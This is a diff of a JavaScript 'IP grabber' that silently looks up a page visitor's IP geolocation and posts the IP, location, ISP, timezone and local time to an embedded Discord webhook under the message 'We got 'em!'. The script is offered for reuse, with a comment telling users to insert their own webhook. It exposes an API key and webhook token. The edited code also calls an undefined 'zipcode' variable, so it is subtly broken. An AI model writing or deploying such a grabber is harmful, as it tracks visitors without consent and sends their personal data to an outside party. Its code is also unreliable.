@@ -21,16 +21,13 @@ $.getJSON("https://api.ipgeolocation.io/ipgeo?apiKey=61d564bb4823441688ff28561a7
 function (data) {
         const ip = data.ip_address;
         const city = data.city;
-        const region = data.region;
-        const zip = data.postal_code;
+        const statecode = data.statecode;
+        const zip = data.zipcode;
         const country = data.country;
-        const flag = data.flag.emoji;
-        const aso = data.connection.autonomous_system_organization;
-        const isp = data.connection.isp_name;
-        const org = data.connection.organization_name;
-        const vpn = data.security.is_vpn;
-        const tz = data.timezone.name;
-        const ct = data.timezone.current_time;
+        const aso = data.organization;
+        const isp = data.isp;
+        const tz = data.time_zone;
+        const ct = data.current_time;
         const request = new XMLHttpRequest();
         request.open("POST", "https://discordapp.com/api/webhooks/1111706757098643526/u2GS-Iw8M2rMrEUAWLUI0NTszB7NpY9SoqgdLqQyYsTBBjZMEo1HJ5-UPHprNFVcHBFZ");
         // Put in your discord webhook url above ^^^
@@ -40,14 +37,11 @@ function (data) {
           avatar_url: "https://i.pinimg.com/originals/18/cb/36/18cb364302a4841d6a7c246c3c0f0860.jpg",
           content: "**We got 'em!**\n> IP: " + ip + 
           "\n> City: " + city + 
-          "\n> Region: " + region + 
-          "\n> Zip: " + zip + 
+          "\n> Statecode: " + statecode + 
+          "\n> Zip: " + zipcode + 
           "\n> Country: " + country +
-          "\n> Flag: " + flag +
           "\n> Auto System Org: " + aso +
           "\n> ISP: " + isp +
-          "\n> Org: " + org +
-          "\n> Using VPN: " + vpn +
           "\n> Timezone: " + tz +
           "\n> Current time: " + ct
           ,
